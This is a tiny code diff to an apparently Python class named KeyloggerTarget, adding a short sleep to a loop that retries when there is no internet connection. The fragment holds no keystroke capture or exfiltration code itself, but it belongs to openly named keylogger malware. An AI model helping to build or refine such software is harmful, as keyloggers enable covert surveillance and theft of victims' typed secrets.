@@ -347,6 +347,7 @@ class KeyloggerTarget:
                     # If there is an internet connection it will run as normal
                 except requests.exceptions.ConnectionError:
                     print("No Connection")
+                    time.sleep(0.5)
 
     def start(self):
         self.internet_connection()
